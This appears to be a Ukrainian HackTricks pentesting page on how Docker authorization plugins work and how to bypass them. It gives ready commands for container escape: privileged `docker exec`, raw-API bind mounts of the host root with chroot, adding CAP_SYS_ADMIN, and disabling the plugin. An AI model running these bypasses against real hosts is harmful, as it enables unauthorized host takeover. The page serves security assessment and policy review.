# Плагіни авторизації під час виконання

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Плагіни авторизації під час виконання — це додатковий рівень політик, який визначає, чи може caller виконати певну дію daemon. Docker є класичним прикладом. За замовчуванням будь-хто, хто може взаємодіяти з Docker daemon, фактично отримує широкий контроль над ним. Плагіни авторизації намагаються звузити цю модель, аналізуючи автентифікованого користувача та запитану API-операцію, після чого дозволяють або відхиляють запит відповідно до політики.

Ця тема заслуговує на окрему сторінку, оскільки змінює модель exploitation, коли attacker уже має доступ до Docker API або до користувача в групі `docker`. У таких середовищах питання полягає вже не лише в тому, "чи можу я підключитися до daemon?", а й у тому, "чи захищений daemon authorization layer і, якщо так, чи можна обійти цей layer через необроблені endpoints, слабкий JSON parsing або permissions на керування plugins?"

## Робота

Коли запит надходить до Docker daemon, authorization subsystem може передати контекст запиту одному або кільком встановленим plugins. Plugin бачить identity автентифікованого користувача, деталі запиту, вибрані headers, а також частини body запиту або response, якщо content type є відповідним. Кілька plugins можна об'єднати в chain, і доступ надається лише тоді, коли всі plugins дозволяють запит.

Ця модель здається надійною, але її безпека повністю залежить від того, наскільки повно автор політики зрозумів API. Plugin, який блокує `docker run --privileged`, але ігнорує `docker exec`, не враховує альтернативні JSON keys, такі як top-level `Binds`, або дозволяє адміністрування plugins, може створити хибне відчуття обмеження, водночас залишаючи відкритими прямі шляхи до privilege escalation.

## Поширені цілі для Plugins

Важливі області для policy review:

- endpoints створення containers
- поля `HostConfig`, такі як `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` і параметри спільного використання namespaces
- поведінка `docker exec`
- endpoints керування plugins
- будь-який endpoint, який може опосередковано запускати runtime actions поза межами передбаченої policy model

Історично такі приклади, як plugin `authz` від Twistlock, і прості educational plugins, наприклад `authobot`, спрощували вивчення цієї моделі, оскільки їхні policy files і code paths показували, як фактично реалізовано зіставлення endpoint-to-action. Для assessment work важливо, щоб автор policy розумів повну API surface, а не лише найпомітніші CLI commands.

## Зловживання

Перша мета — з'ясувати, що саме блокується. Якщо daemon відхиляє action, помилка часто leaks назву plugin, що допомагає визначити, який саме control використовується:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Якщо вам потрібне ширше профілювання endpoint'ів, такі інструменти, як `docker_auth_profiler`, корисні, оскільки вони автоматизують інакше повторюване завдання перевірки того, які маршрути API та JSON-структури дійсно дозволені плагіном.

Якщо середовище використовує custom plugin і ви можете взаємодіяти з API, перелічіть, які поля об'єктів насправді фільтруються:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ці перевірки важливі, оскільки багато помилок авторизації є специфічними для полів, а не для концепцій. Плагін може відхилити шаблон CLI, не блокуючи повністю еквівалентну структуру API.

### Повний приклад: `docker exec` додає привілеї після створення контейнера

Політику, яка блокує створення привілейованих контейнерів, але дозволяє створення контейнерів без обмежень разом із `docker exec`, усе ще можна обійти:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Якщо daemon приймає другий крок, користувач отримує привілейований інтерактивний процес усередині container, який, на думку автора policy, мав бути обмеженим.

### Повний приклад: Bind Mount через Raw API

Деякі зламані policy перевіряють лише одну JSON-форму. Якщо bind mount кореневої файлової системи не блокується послідовно, host усе ще можна змонтувати:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Та сама ідея також може бути представлена в `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Наслідком є повний вихід до файлової системи хоста. Цікава деталь полягає в тому, що обхід походить із неповного охоплення policy, а не з помилки kernel.

### Повний приклад: неперевірений атрибут capability

Якщо policy забуває фільтрувати атрибут, пов’язаний із capability, attacker може створити container, який повторно отримує небезпечну capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Щойно присутня `CAP_SYS_ADMIN` або подібна потужна capability, стають доступними багато технік breakout, описаних у [capabilities.md](protections/capabilities.md) і [privileged-containers.md](privileged-containers.md).

### Повний приклад: вимкнення Plugin

Якщо дозволені операції керування plugin, найчистішим bypass може бути повне вимкнення контролю:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Це помилка політики на рівні control plane. Рівень авторизації існує, але користувач, якого він мав обмежувати, усе ще має дозвіл його вимкнути.

## Перевірки

Ці команди призначені для визначення того, чи існує рівень політики та чи він здається повним, або ж є поверхневим.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Що тут цікаво:

- Повідомлення про відмову, які містять назву плагіна, підтверджують наявність authorization layer і часто розкривають точну реалізацію.
- Список плагінів, видимий attacker, може бути достатнім, щоб з'ясувати, чи можливі операції disable або reconfigure.
- Policy, яка блокує лише очевидні CLI actions, але не raw API requests, має вважатися bypassable, доки не доведено протилежне.

## Типові налаштування runtime

| Runtime / platform | Типовий стан | Типова поведінка | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Не ввімкнено за замовчуванням | Доступ до daemon фактично працює за принципом all-or-nothing, якщо не налаштовано authorization plugin | неповна plugin policy, blacklists замість allowlists, дозвіл на керування плагінами, blind spots на рівні полів |
| Podman | Не має поширеного прямого еквівалента | Podman зазвичай більше покладається на Unix permissions, rootless execution і рішення щодо API exposure, ніж на authz plugins у стилі Docker | широке відкриття rootful Podman API, слабкі socket permissions |
| containerd / CRI-O | Інша модель керування | Ці runtimes зазвичай покладаються на socket permissions, межі довіри вузла та controls на рівні вищого orchestrator, а не на Docker authz plugins | монтування socket у workloads, слабкі припущення щодо локальної довіри до вузла |
| Kubernetes | Використовує authn/authz на рівнях API-server і kubelet, а не Docker authz plugins | Cluster RBAC і admission controls є основним policy layer | надто широкі RBAC permissions, слабка admission policy, пряме відкриття kubelet або runtime APIs |

{{#include ../../../banners/hacktricks-training.md}}
